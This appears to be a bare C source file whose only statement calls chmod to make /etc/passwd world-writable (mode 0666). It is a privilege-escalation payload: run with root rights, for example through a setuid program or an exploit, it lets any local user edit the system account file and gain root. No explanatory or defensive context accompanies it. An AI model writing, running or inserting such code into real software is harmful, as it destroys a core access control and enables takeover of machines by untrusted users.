#include <sys/types.h>
#include <sys/stat.h>
main()
{
	chmod("/etc/passwd",00666);	 
}
